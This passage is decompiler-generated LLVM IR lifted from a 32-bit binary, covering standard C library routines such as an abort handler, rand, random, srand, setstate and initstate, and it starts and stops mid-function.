  %v0_805f8c7 = phi i32 [ %v12_805f8c2, %entry ], [ %v0_805f8c7.pre, %dec_label_pc_805f8c7.dec_label_pc_805f8c7_crit_edge ]
  %v1_805f8d219 = phi i32 [ 31, %entry ], [ %v1_805f8d2, %dec_label_pc_805f8c7.dec_label_pc_805f8c7_crit_edge ]
  %v2_805f8c7 = mul i32 %v1_805f8d219, 4
  %v3_805f8c7 = add i32 %v2_805f8c7, 152
  %v4_805f8c7 = add i32 %v3_805f8c7, %v0_805f8c7
  %v5_805f8c7 = inttoptr i32 %v4_805f8c7 to i32*
  store i32 0, i32* %v5_805f8c7, align 4
  %v0_805f8d2.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805f8d2 = add i32 %v0_805f8d2.pre, -1
  %v9_805f8d2 = icmp slt i32 %v1_805f8d2, 0
  store i32 %v1_805f8d2, i32* %eax.global-to-local, align 4
  %v1_805f8d3 = icmp eq i1 %v9_805f8d2, false
  br i1 %v1_805f8d3, label %dec_label_pc_805f8c7.dec_label_pc_805f8c7_crit_edge, label %dec_label_pc_805f8d5

dec_label_pc_805f8c7.dec_label_pc_805f8c7_crit_edge: ; preds = %dec_label_pc_805f8c7
  %v0_805f8c7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805f8c7

dec_label_pc_805f8d5:                             ; preds = %dec_label_pc_805f8c7
  %v0_805f8d5 = load i32, i32* @ebx, align 4
  %v2_805f8d9 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805f8d9, i32* @ebx, align 4
  %v4_805f8e1 = call i32 @__sigaddset(i32 %v2_805f8d9, i32 6, i32 %v0_805f8d5, i32 %v0_805f8d5)
  store i32 %v4_805f8e1, i32* %eax.global-to-local, align 4
  %v1_805f8e9 = icmp eq i32 %v4_805f8e1, 0
  %v1_805f8eb = icmp eq i1 %v1_805f8e9, false
  br i1 %v1_805f8eb, label %dec_label_pc_805f8fb, label %dec_label_pc_805f8ed

dec_label_pc_805f8ed:                             ; preds = %dec_label_pc_805f8d5
  %v3_805f8f3 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_805f8f3 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_805f8f3, i32 0)
  store i32 %v4_805f8f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f8fb

dec_label_pc_805f8fb:                             ; preds = %dec_label_pc_805f8d5, %dec_label_pc_805f8ed
  %v2_805f9334 = phi i32 [ %v4_805f8e1, %dec_label_pc_805f8d5 ], [ %v4_805f8f3, %dec_label_pc_805f8ed ]
  %v0_805f8fb = load i8, i8* @global_var_807c8a0.788, align 32
  %v1_805f8fb = icmp eq i8 %v0_805f8fb, 0
  %v1_805f902 = icmp eq i1 %v1_805f8fb, false
  br i1 %v1_805f902, label %dec_label_pc_805f933, label %dec_label_pc_805f904

dec_label_pc_805f904:                             ; preds = %dec_label_pc_805f8fb
  store i8 1, i8* @global_var_807c8a0.788, align 32
  br label %dec_label_pc_805f90b

dec_label_pc_805f90b:                             ; preds = %dec_label_pc_805f972, %dec_label_pc_805f904
  %v1_805f913 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8073ec8.787 to i32))
  store i32 %v1_805f913, i32* %eax.global-to-local, align 4
  %v1_805f91f = call i32 @__GI_raise(i32 6)
  store i32 %v1_805f91f, i32* %eax.global-to-local, align 4
  %v1_805f92b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ec8.787 to i32))
  store i32 %v1_805f92b, i32* %eax.global-to-local, align 4
  %v0_805f933.pre = load i8, i8* @global_var_807c8a0.788, align 32
  br label %dec_label_pc_805f933

dec_label_pc_805f933:                             ; preds = %dec_label_pc_805f8fb, %dec_label_pc_805f90b
  %v2_805f933 = phi i32 [ %v2_805f9334, %dec_label_pc_805f8fb ], [ %v1_805f92b, %dec_label_pc_805f90b ]
  %v0_805f933 = phi i8 [ %v0_805f8fb, %dec_label_pc_805f8fb ], [ %v0_805f933.pre, %dec_label_pc_805f90b ]
  %v1_805f933 = zext i8 %v0_805f933 to i32
  %v3_805f933 = and i32 %v2_805f933, -256
  %v4_805f933 = or i32 %v1_805f933, %v3_805f933
  store i32 %v4_805f933, i32* %eax.global-to-local, align 4
  %v10_805f938 = icmp eq i8 %v0_805f933, 1
  %v1_805f93a = icmp eq i1 %v10_805f938, false
  br i1 %v1_805f93a, label %dec_label_pc_805f994, label %dec_label_pc_805f93c

dec_label_pc_805f93c:                             ; preds = %dec_label_pc_805f933
  store i8 2, i8* @global_var_807c8a0.788, align 32
  %v2_805f94b = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_805f94b, i32* %eax.global-to-local, align 4
  %v3_805f950 = bitcast i32* %stack_var_-272 to i8*
  %v4_805f950 = call i32 @__GI_memset(i8* %v3_805f950, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f967

dec_label_pc_805f967:                             ; preds = %dec_label_pc_805f967.dec_label_pc_805f967_crit_edge, %dec_label_pc_805f93c
  %v0_805f967 = phi i32 [ %v12_805f8c2, %dec_label_pc_805f93c ], [ %v0_805f967.pre, %dec_label_pc_805f967.dec_label_pc_805f967_crit_edge ]
  %v1_805f96f18 = phi i32 [ 31, %dec_label_pc_805f93c ], [ %v1_805f96f, %dec_label_pc_805f967.dec_label_pc_805f967_crit_edge ]
  %v2_805f967 = mul i32 %v1_805f96f18, 4
  %v3_805f967 = add i32 %v2_805f967, 16
  %v4_805f967 = add i32 %v3_805f967, %v0_805f967
  %v5_805f967 = inttoptr i32 %v4_805f967 to i32*
  store i32 -1, i32* %v5_805f967, align 4
  %v0_805f96f.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805f96f = add i32 %v0_805f96f.pre, -1
  %v9_805f96f = icmp slt i32 %v1_805f96f, 0
  store i32 %v1_805f96f, i32* %eax.global-to-local, align 4
  %v1_805f970 = icmp eq i1 %v9_805f96f, false
  br i1 %v1_805f970, label %dec_label_pc_805f967.dec_label_pc_805f967_crit_edge, label %dec_label_pc_805f972

dec_label_pc_805f967.dec_label_pc_805f967_crit_edge: ; preds = %dec_label_pc_805f967
  %v0_805f967.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805f967

dec_label_pc_805f972:                             ; preds = %dec_label_pc_805f967
  store i32 %v2_805f94b, i32* %eax.global-to-local, align 4
  %v4_805f987 = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_805f987, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f90b

dec_label_pc_805f994:                             ; preds = %dec_label_pc_805f933
  %v10_805f994 = icmp eq i8 %v0_805f933, 2
  %v1_805f996 = icmp eq i1 %v10_805f994, false
  br i1 %v1_805f996, label %dec_label_pc_805f9a0, label %dec_label_pc_805f998

dec_label_pc_805f998:                             ; preds = %dec_label_pc_805f994
  store i8 3, i8* @global_var_807c8a0.788, align 32
  br label %dec_label_pc_805f9a0

dec_label_pc_805f9a0:                             ; preds = %dec_label_pc_805f994, %dec_label_pc_805f998
  %v0_805f9a0 = phi i8 [ %v0_805f933, %dec_label_pc_805f994 ], [ 3, %dec_label_pc_805f998 ]
  %v9_805f9a0 = icmp eq i8 %v0_805f9a0, 3
  %v1_805f9a7 = icmp eq i1 %v9_805f9a0, false
  br i1 %v1_805f9a7, label %dec_label_pc_805f9ba, label %dec_label_pc_805f9a9

dec_label_pc_805f9a9:                             ; preds = %dec_label_pc_805f9a0
  store i8 4, i8* @global_var_807c8a0.788, align 32
  %v1_805f9b5 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805f9ba:                             ; preds = %dec_label_pc_805f9a0, %dec_label_pc_805f9ba
  br label %dec_label_pc_805f9ba

; uselistorder directives
  uselistorder i32 %v1_805f96f, { 2, 1, 0 }
  uselistorder i8 %v0_805f933, { 2, 0, 1, 3 }
  uselistorder i32 %v1_805f8d2, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 13, 14, 9, 10, 12, 11, 1 }
  uselistorder i8 3, { 0, 3, 5, 1, 4, 2 }
  uselistorder i32 (i32)* @pthread_mutex_unlock, { 0, 13, 3, 2, 6, 1, 12, 11, 10, 9, 8, 7, 5, 4 }
  uselistorder i8* @global_var_807c8a0.788, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805f9ba, { 1, 0 }
  uselistorder label %dec_label_pc_805f9a0, { 1, 0 }
  uselistorder label %dec_label_pc_805f933, { 1, 0 }
  uselistorder label %dec_label_pc_805f8fb, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_805f9c0 = call i32 @random()
  ret i32 %v0_805f9c0

; uselistorder directives
  uselistorder i32 ()* @random, { 35, 14, 13, 6, 33, 32, 5, 4, 3, 2, 1, 0, 20, 19, 34, 18, 17, 16, 15, 12, 11, 10, 9, 8, 7, 31, 30, 29, 28, 27, 26, 25, 21, 24, 23, 22 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805f9c8 = load i32, i32* @ebx, align 4
  store i32 %v0_805f9c8, i32* %stack_var_-4, align 4
  %v2_805f9d6 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805f9d6, i32* @ebx, align 4
  %v4_805f9db = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134583465, i32 ptrtoint (i32* @global_var_8073ee0.789 to i32))
  %v1_805f9e7 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ee0.789 to i32))
  store i32 ptrtoint (i32* @global_var_8073ee0.789 to i32), i32* @ecx, align 4
  %v2_805f9ee = ptrtoint i32* %stack_var_-8 to i32
  %v3_805f9f8 = call i32 @__GI_random_r(i32* nonnull @global_var_8073ef8, i32 %v2_805f9ee)
  %v3_805fa02 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v3_805fa07 = load i32, i32* %stack_var_-8, align 4
  %v2_805fa0e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805fa0e, i32* @ebx, align 4
  ret i32 %v3_805fa07
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_805fa26 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134583465, i32 ptrtoint (i32* @global_var_8073ee0.789 to i32))
  %v1_805fa32 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ee0.789 to i32))
  %v0_805fa3e = load i32, i32* bitcast (i32** @global_var_8073f00.792 to i32*), align 256
  store i32 %v0_805fa3e, i32* @ebx, align 4
  %v3_805fa48 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8073ef8)
  %v2_805fa50 = icmp slt i32 %v3_805fa48, 0
  br i1 %v2_805fa50, label %dec_label_pc_805fa57, label %dec_label_pc_805fa54

dec_label_pc_805fa54:                             ; preds = %entry
  br label %dec_label_pc_805fa57

dec_label_pc_805fa57:                             ; preds = %entry, %dec_label_pc_805fa54
  %v3_805fa60 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_805fa65 = load i32, i32* @esi, align 4
  ret i32 %v0_805fa65

; uselistorder directives
  uselistorder label %dec_label_pc_805fa57, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_805fa7c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805fa7c, i32* @ebx, align 4
  %v4_805fa81 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134583465, i32 ptrtoint (i32* @global_var_8073ee0.789 to i32))
  %v1_805fa8d = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ee0.789 to i32))
  %v0_805fa97 = load i32, i32* bitcast (i32** @global_var_8073f00.792 to i32*), align 256
  store i32 %v0_805fa97, i32* @esi, align 4
  %v4_805faa9 = inttoptr i32 %arg2 to i32*
  %v5_805faa9 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_805faa9, i32 %arg3, i32 ptrtoint (i32* @global_var_8073ef8 to i32))
  %v3_805fab4 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 ptrtoint (i32** @global_var_8073efc.793 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805fac4 = load i32, i32* @ebx, align 4
  store i32 %v0_805fac4, i32* %stack_var_-4, align 4
  %v2_805fad2 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805fad2, i32* @ebx, align 4
  %v4_805fad7 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134583465, i32 ptrtoint (i32* @global_var_8073ee0.789 to i32))
  %v1_805fae3 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ee0.789 to i32))
  %v2_805faf3 = sext i32 %arg1 to i64
  %v3_805faf3 = call i32 @srandom_r(i64 %v2_805faf3, i32 ptrtoint (i32* @global_var_8073ef8 to i32))
  store i32 %arg1, i32* @ecx, align 4
  %v3_805fafd = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v2_805fb05 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805fb05, i32* @ebx, align 4
  ret i32 %v3_805fafd

; uselistorder directives
  uselistorder i32* @global_var_8073ef8, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8073ef8 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8073ee0.789 to i32), { 5, 1, 6, 2, 7, 3, 0, 8, 4 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_805fb0b = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_805fb17 = add i32 %arg1, 4
  store i32 %v1_805fb17, i32* %esi.global-to-local, align 4
  %v1_805fb1a = add i32 %tmp4, 12
  %v2_805fb1a = inttoptr i32 %v1_805fb1a to i32*
  %v3_805fb1a = load i32, i32* %v2_805fb1a, align 4
  store i32 %v3_805fb1a, i32* @ecx, align 4
  %v1_805fb1d = add i32 %tmp4, 8
  %v2_805fb1d = inttoptr i32 %v1_805fb1d to i32*
  %v3_805fb1d = load i32, i32* %v2_805fb1d, align 4
  %v1_805fb20 = icmp eq i32 %v3_805fb1a, 0
  %v1_805fb22 = icmp eq i1 %v1_805fb20, false
  br i1 %v1_805fb22, label %dec_label_pc_805fb2d, label %dec_label_pc_805fb24

dec_label_pc_805fb24:                             ; preds = %entry
  %v1_805fb24 = add i32 %v3_805fb1d, -4
  %v2_805fb24 = inttoptr i32 %v1_805fb24 to i32*
  store i32 0, i32* %v2_805fb24, align 4
  br label %dec_label_pc_805fb3d

dec_label_pc_805fb2d:                             ; preds = %entry
  %v1_805fb2d = add i32 %tmp4, 4
  %v2_805fb2d = inttoptr i32 %v1_805fb2d to i32*
  %v3_805fb2d = load i32, i32* %v2_805fb2d, align 4
  %v2_805fb30 = sub i32 %v3_805fb2d, %v3_805fb1d
  %v2_805fb32 = sdiv i32 %v2_805fb30, 4
  %v3_805fb35 = mul i32 %v2_805fb32, 5
  %v2_805fb38 = add i32 %v3_805fb35, %v3_805fb1a
  store i32 %v2_805fb38, i32* %eax.global-to-local, align 4
  %v2_805fb3a = add i32 %v3_805fb1d, -4
  %v3_805fb3a = inttoptr i32 %v2_805fb3a to i32*
  store i32 %v2_805fb38, i32* %v3_805fb3a, align 4
  br label %dec_label_pc_805fb3d

dec_label_pc_805fb3d:                             ; preds = %dec_label_pc_805fb24, %dec_label_pc_805fb2d
  %v0_805fb3d = load i32, i32* %esi.global-to-local, align 4
  %v1_805fb3d = add i32 %v0_805fb3d, -4
  %v2_805fb3d = inttoptr i32 %v1_805fb3d to i32*
  %v3_805fb3d = load i32, i32* %v2_805fb3d, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_805fb45 = ashr i32 %v3_805fb3d, 31
  %v2_805fb46 = zext i32 %v3_805fb3d to i64
  %v4_805fb46 = zext i32 %v1_805fb45 to i64
  %v5_805fb46 = mul nuw i64 %v4_805fb46, 4294967296
  %v6_805fb46 = or i64 %v5_805fb46, %v2_805fb46
  %v8_805fb46 = sdiv i64 %v6_805fb46, 5
  %v9_805fb46 = trunc i64 %v8_805fb46 to i32
  store i32 %v9_805fb46, i32* %eax.global-to-local, align 4
  %v10_805fb46 = srem i64 %v6_805fb46, 5
  %v11_805fb46 = trunc i64 %v10_805fb46 to i32
  %v6_805fb4b = icmp ugt i32 %v11_805fb46, 4
  br i1 %v6_805fb4b, label %dec_label_pc_805fb8b, label %dec_label_pc_805fb4d

dec_label_pc_805fb4d:                             ; preds = %dec_label_pc_805fb3d
  %v1_805fb4d = mul i32 %v11_805fb46, 4
  %v2_805fb4d = add i32 %v1_805fb4d, ptrtoint (i32* @global_var_806db14.794 to i32)
  %v3_805fb4d = inttoptr i32 %v2_805fb4d to i32*
  %v4_805fb4d = load i32, i32* %v3_805fb4d, align 4
  store i32 %v4_805fb4d, i32* @ecx, align 4
  %v2_805fb54 = add i32 %v1_805fb4d, ptrtoint (i32* @global_var_806db00.795 to i32)
  %v3_805fb54 = inttoptr i32 %v2_805fb54 to i32*
  %v4_805fb54 = load i32, i32* %v3_805fb54, align 4
  store i32 %v4_805fb54, i32* %ebp.global-to-local, align 4
  %v1_805fb5b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805fb5b = add i32 %v1_805fb5b, 16
  %v3_805fb5b = inttoptr i32 %v2_805fb5b to i32*
  store i32 %v4_805fb4d, i32* %v3_805fb5b, align 4
  %v0_805fb5e = load i32, i32* %ebp.global-to-local, align 4
  %v1_805fb5e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805fb5e = add i32 %v1_805fb5e, 20
  %v3_805fb5e = inttoptr i32 %v2_805fb5e to i32*
  store i32 %v0_805fb5e, i32* %v3_805fb5e, align 4
  %v1_805fb61 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805fb61 = add i32 %v1_805fb61, 12
  %v3_805fb61 = inttoptr i32 %v2_805fb61 to i32*
  store i32 %v11_805fb46, i32* %v3_805fb61, align 4
  %v1_805fb64 = icmp eq i32 %v11_805fb46, 0
  br i1 %v1_805fb64, label %dec_label_pc_805fb7e, label %dec_label_pc_805fb68

dec_label_pc_805fb68:                             ; preds = %dec_label_pc_805fb4d
  %v0_805fb68 = load i32, i32* %esi.global-to-local, align 4
  %v1_805fb68 = add i32 %v0_805fb68, -4
  %v2_805fb68 = inttoptr i32 %v1_805fb68 to i32*
  %v3_805fb68 = load i32, i32* %v2_805fb68, align 4
  %v1_805fb6b = ashr i32 %v3_805fb68, 31
  %v0_805fb6c = load i32, i32* %edi.global-to-local, align 4
  %v2_805fb6c = zext i32 %v3_805fb68 to i64
  %v4_805fb6c = zext i32 %v1_805fb6b to i64
  %v5_805fb6c = mul nuw i64 %v4_805fb6c, 4294967296
  %v6_805fb6c = or i64 %v5_805fb6c, %v2_805fb6c
  %v7_805fb6c = zext i32 %v0_805fb6c to i64
  %v8_805fb6c = sdiv i64 %v6_805fb6c, %v7_805fb6c
  %v9_805fb6c = trunc i64 %v8_805fb6c to i32
  %v2_805fb6e = mul i32 %v9_805fb6c, 4
  %v3_805fb6e = add i32 %v2_805fb6e, %v0_805fb68
  %v1_805fb71 = load i32, i32* %ebp.global-to-local, align 4
  %v2_805fb71 = add i32 %v1_805fb71, %v9_805fb6c
  store i32 %v2_805fb71, i32* %eax.global-to-local, align 4
  %v1_805fb73 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805fb73 = add i32 %v1_805fb73, 4
  %v3_805fb73 = inttoptr i32 %v2_805fb73 to i32*
  store i32 %v3_805fb6e, i32* %v3_805fb73, align 4
  %v0_805fb76 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fb76 = ashr i32 %v0_805fb76, 31
  %v0_805fb77 = load i32, i32* @ecx, align 4
  %v2_805fb77 = zext i32 %v0_805fb76 to i64
  %v4_805fb77 = zext i32 %v1_805fb76 to i64
  %v5_805fb77 = mul nuw i64 %v4_805fb77, 4294967296
  %v6_805fb77 = or i64 %v5_805fb77, %v2_805fb77
  %v7_805fb77 = zext i32 %v0_805fb77 to i64
  %v8_805fb77 = sdiv i64 %v6_805fb77, %v7_805fb77
  %v9_805fb77 = trunc i64 %v8_805fb77 to i32
  store i32 %v9_805fb77, i32* %eax.global-to-local, align 4
  %v10_805fb77 = srem i64 %v6_805fb77, %v7_805fb77
  %v11_805fb77 = trunc i64 %v10_805fb77 to i32
  %v0_805fb79 = load i32, i32* %esi.global-to-local, align 4
  %v2_805fb79 = mul i32 %v11_805fb77, 4
  %v3_805fb79 = add i32 %v2_805fb79, %v0_805fb79
  %v1_805fb7c = load i32, i32* %ebx.global-to-local, align 4
  %v2_805fb7c = inttoptr i32 %v1_805fb7c to i32*
  store i32 %v3_805fb79, i32* %v2_805fb7c, align 4
  br label %dec_label_pc_805fb7e

dec_label_pc_805fb7e:                             ; preds = %dec_label_pc_805fb4d, %dec_label_pc_805fb68
  %v0_805fb7e = load i32, i32* %esi.global-to-local, align 4
  %v1_805fb7e = load i32, i32* @ecx, align 4
  %v2_805fb7e = mul i32 %v1_805fb7e, 4
  %v3_805fb7e = add i32 %v2_805fb7e, %v0_805fb7e
  store i32 %v3_805fb7e, i32* %eax.global-to-local, align 4
  %v1_805fb81 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805fb81 = add i32 %v1_805fb81, 8
  %v3_805fb81 = inttoptr i32 %v2_805fb81 to i32*
  store i32 %v0_805fb7e, i32* %v3_805fb81, align 4
  %v0_805fb84 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fb84 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805fb84 = add i32 %v1_805fb84, 24
  %v3_805fb84 = inttoptr i32 %v2_805fb84 to i32*
  store i32 %v0_805fb84, i32* %v3_805fb84, align 4
  br label %dec_label_pc_805fb99

dec_label_pc_805fb8b:                             ; preds = %dec_label_pc_805fb3d
  %v1_805fb8b = call i32 @__errno_location(i32 %v0_805fb0b)
  store i32 %v1_805fb8b, i32* %eax.global-to-local, align 4
  %v1_805fb90 = inttoptr i32 %v1_805fb8b to i32*
  store i32 22, i32* %v1_805fb90, align 4
  br label %dec_label_pc_805fb99

dec_label_pc_805fb99:                             ; preds = %dec_label_pc_805fb7e, %dec_label_pc_805fb8b
  %storemerge = phi i32 [ -1, %dec_label_pc_805fb8b ], [ 0, %dec_label_pc_805fb7e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805fb0b, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_805fb7e, { 1, 0 }
  uselistorder i32 %v11_805fb46, { 1, 2, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_805fb99, { 1, 0 }
  uselistorder label %dec_label_pc_805fb7e, { 1, 0 }
  uselistorder label %dec_label_pc_805fb3d, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_805fba4 = load i32, i32* @ebx, align 4
  store i32 %v0_805fba4, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_805fbad = add i32 %tmp2, 8
  %v2_805fbad = inttoptr i32 %v1_805fbad to i32*
  %v3_805fbad = load i32, i32* %v2_805fbad, align 4
  store i32 %v3_805fbad, i32* %esi.global-to-local, align 4
  %v1_805fbb0 = add i32 %tmp2, 12
  %v2_805fbb0 = inttoptr i32 %v1_805fbb0 to i32*
  %v3_805fbb0 = load i32, i32* %v2_805fbb0, align 4
  %v4_805fbb0 = icmp eq i32 %v3_805fbb0, 0
  %v1_805fbb4 = icmp eq i1 %v4_805fbb0, false
  br i1 %v1_805fbb4, label %dec_label_pc_805fbcd, label %dec_label_pc_805fbb6

dec_label_pc_805fbb6:                             ; preds = %entry
  %v2_805fbb6 = inttoptr i32 %v3_805fbad to i32*
  %v3_805fbb6 = load i32, i32* %v2_805fbb6, align 4
  %v5_805fbb6 = mul i32 %v3_805fbb6, 1103515245
  %v1_805fbbc = add i32 %v5_805fbb6, 12345
  %v1_805fbc1 = urem i32 %v1_805fbbc, -2147483648
  store i32 %v1_805fbc1, i32* %eax.global-to-local, align 4
  store i32 %v1_805fbc1, i32* %v2_805fbb6, align 4
  %v0_805fbc8 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fbc8 = load i32, i32* %ebp.global-to-local, align 4
  %v2_805fbc8 = inttoptr i32 %v1_805fbc8 to i32*
  store i32 %v0_805fbc8, i32* %v2_805fbc8, align 4
  br label %dec_label_pc_805fbf9

dec_label_pc_805fbcd:                             ; preds = %entry
  %v1_805fbcd = add i32 %tmp2, 4
  %v2_805fbcd = inttoptr i32 %v1_805fbcd to i32*
  %v3_805fbcd = load i32, i32* %v2_805fbcd, align 4
  store i32 %v3_805fbcd, i32* @ecx, align 4
  %v2_805fbd0 = load i32, i32* %arg1, align 4
  store i32 %v2_805fbd0, i32* %edx.global-to-local, align 4
  %v1_805fbd2 = add i32 %tmp2, 24
  %v2_805fbd2 = inttoptr i32 %v1_805fbd2 to i32*
  %v3_805fbd2 = load i32, i32* %v2_805fbd2, align 4
  store i32 %v3_805fbd2, i32* %edi.global-to-local, align 4
  %v1_805fbd5 = inttoptr i32 %v3_805fbcd to i32*
  %v2_805fbd5 = load i32, i32* %v1_805fbd5, align 4
  store i32 %v2_805fbd5, i32* %eax.global-to-local, align 4
  %v1_805fbd7 = inttoptr i32 %v2_805fbd0 to i32*
  %v2_805fbd7 = load i32, i32* %v1_805fbd7, align 4
  %v4_805fbd7 = add i32 %v2_805fbd7, %v2_805fbd5
  store i32 %v4_805fbd7, i32* %v1_805fbd7, align 4
  %v0_805fbd9 = load i32, i32* %edx.global-to-local, align 4
  %v1_805fbd9 = inttoptr i32 %v0_805fbd9 to i32*
  %v2_805fbd9 = load i32, i32* %v1_805fbd9, align 4
  %v1_805fbdb = add i32 %v0_805fbd9, 4
  store i32 %v1_805fbdb, i32* %edx.global-to-local, align 4
  %v2_805fbde = udiv i32 %v2_805fbd9, 2
  %v1_805fbe0 = load i32, i32* %edi.global-to-local, align 4
  %v7_805fbe0 = icmp ult i32 %v1_805fbdb, %v1_805fbe0
  %v1_805fbe2 = load i32, i32* %ebp.global-to-local, align 4
  %v2_805fbe2 = inttoptr i32 %v1_805fbe2 to i32*
  store i32 %v2_805fbde, i32* %v2_805fbe2, align 4
  %v0_805fbe5 = load i32, i32* @ecx, align 4
  %v1_805fbe5 = add i32 %v0_805fbe5, 4
  store i32 %v1_805fbe5, i32* %eax.global-to-local, align 4
  br i1 %v7_805fbe0, label %dec_label_pc_805fbee, label %dec_label_pc_805fbea

dec_label_pc_805fbea:                             ; preds = %dec_label_pc_805fbcd
  %v0_805fbea = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805fbea, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805fbf4

dec_label_pc_805fbee:                             ; preds = %dec_label_pc_805fbcd
  %v1_805fbee = load i32, i32* %edi.global-to-local, align 4
  %v7_805fbee = icmp ult i32 %v1_805fbe5, %v1_805fbee
  br i1 %v7_805fbee, label %dec_label_pc_805fbf4, label %dec_label_pc_805fbf2

dec_label_pc_805fbf2:                             ; preds = %dec_label_pc_805fbee
  %v0_805fbf2 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805fbf2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fbf4

dec_label_pc_805fbf4:                             ; preds = %dec_label_pc_805fbee, %dec_label_pc_805fbea, %dec_label_pc_805fbf2
  %v0_805fbf4 = load i32, i32* %edx.global-to-local, align 4
  %v1_805fbf4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805fbf4 = inttoptr i32 %v1_805fbf4 to i32*
  store i32 %v0_805fbf4, i32* %v2_805fbf4, align 4
  %v0_805fbf6 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fbf6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805fbf6 = add i32 %v1_805fbf6, 4
  %v3_805fbf6 = inttoptr i32 %v2_805fbf6 to i32*
  store i32 %v0_805fbf6, i32* %v3_805fbf6, align 4
